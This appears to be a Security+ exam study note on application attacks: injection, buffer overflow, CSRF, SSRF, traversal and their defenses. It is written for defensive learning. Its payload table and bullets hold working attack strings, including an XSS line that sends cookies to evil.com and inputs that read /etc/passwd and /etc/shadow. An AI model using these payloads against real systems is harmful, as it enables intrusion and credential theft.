# Application Attacks

## What it is

In Watch Dogs, Aiden Pearce doesn't kick down doors — he opens them by feeding malformed input into the ctOS systems that run Chicago. Hack a junction box, slip a crafted command into a traffic light, and the whole intersection becomes your weapon. That's exactly what application attacks do — they exploit the gap between what software *expects* and what an attacker actually sends.

**Application attacks** are exploits that target vulnerabilities in software logic, input handling, memory management, or session control to manipulate program behavior beyond its intended design.

## Why it matters

Web and mobile apps are now the largest attack surface in most enterprises, and a single unvalidated input field can hand over an entire database, a privileged shell, or every active user session. SY0-701 Objective 2.4 explicitly lists **injection**, **buffer overflow**, **replay**, **privilege escalation**, **forgery (CSRF)**, and **directory traversal** — expect CompTIA to give you a code snippet, log entry, or URL string and ask you to identify the attack. The classic trap: confusing **XSS** (victim's browser executes the script) with **SQLi** (database executes the query) — read the payload, not the question stem.

## Key facts

### Injection attacks

| Attack | Target | Example payload |
|---|---|---|
| [[SQL Injection]] (**SQLi**) | Backend database | `' OR '1'='1' --` |
| [[LDAP Injection]] | Directory service | `*)(uid=*))(|(uid=*` |
| [[XML Injection]] / [[XXE]] | XML parser | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| [[Command Injection]] | OS shell | `; cat /etc/shadow` |
| [[Cross-Site Scripting]] (**XSS**) | Victim's browser | `<script>document.location='evil.com/?c='+document.cookie</script>` |

**XSS variants** to memorize:
- **Stored/Persistent** — payload saved on server (forum post, profile field)
- **Reflected** — payload bounced off server via crafted URL
- **DOM-based** — never touches the server; runs entirely in the client

### Memory attacks

- **[[Buffer Overflow]]** — writing past the bounds of a fixed-size buffer to overwrite adjacent memory, often the **return pointer**, redirecting execution to attacker shellcode.
- **Stack overflow** vs **heap overflow** — different memory regions, same root cause: missing bounds checking. Defenses: **[[ASLR]]** (Address Space Layout Randomization), **[[DEP]]** / NX bit, **stack canaries**, safe languages (Rust, Go).
- **[[Race Condition]]** — exploiting timing between **Time-of-Check** and **Time-of-Use** (**TOCTOU**). Classic: check file permissions, then use file — attacker swaps the file in between.

### Session and request attacks

- **[[Replay Attack]]** — captured authentication token or request is resent to impersonate the user. Defense: **[[nonces]]**, timestamps, **[[TLS]]**, **session tokens** with short TTLs.
- **[[Session Hijacking]]** — stealing an active session cookie (often via XSS or sniffing).
- **[[Cross-Site Request Forgery]]** (**CSRF/XSRF**) — victim's authenticated browser is tricked into submitting an attacker's request. Defense: **anti-CSRF tokens**, `SameSite` cookie attribute, re-authentication on sensitive actions.
- **[[Server-Side Request Forgery]]** (**SSRF**) — tricking the server into making requests on the attacker's behalf, often pivoting into internal networks or cloud metadata endpoints (`169.254.169.254`).

### Privilege and path attacks

- **[[Privilege Escalation]]** — **vertical** (user → admin) or **horizontal** (user A → user B). Roots: misconfigured **SUID** binaries, unpatched kernels, weak service account permissions.
- **[[Directory Traversal]]** — escaping the web root via `../../../etc/passwd` or URL-encoded `%2e%2e%2f`. Defense: input canonicalization, chroot jails, allow-listed paths.
- **[[Forgery]]** — broader category covering **request forgery** (CSRF/SSRF) and **token/credential forgery** (e.g., forged JWTs with `alg: none`).

### Core defenses (objective 2.4 expects these)

- **[[Input Validation]]** — allow-list over deny-list, server-side always
- **[[Output Encoding]]** — context-aware (HTML, JS, URL, SQL)
- **[[Parameterized Queries]]** / prepared statements — kills SQLi at the root
- **[[Web Application Firewall]]** (**WAF**) — signature and behavior-based filtering
- **[[Secure Cookies]]** — `HttpOnly`, `Secure`, `SameSite=Strict`
- **[[Code Signing]]** and **[[SAST]]** / **[[DAST]]** in the CI/CD pipeline

## Related concepts

[[OWASP Top 10]] · [[Secure Coding Practices]] · [[Fuzzing]] · [[Input Validation]] · [[WAF]] · [[Vulnerability Scanning]] · [[Zero-Day]] · [[Patch Management]]

---
*Source: VIRGIL knowledge base — 2026-05-08*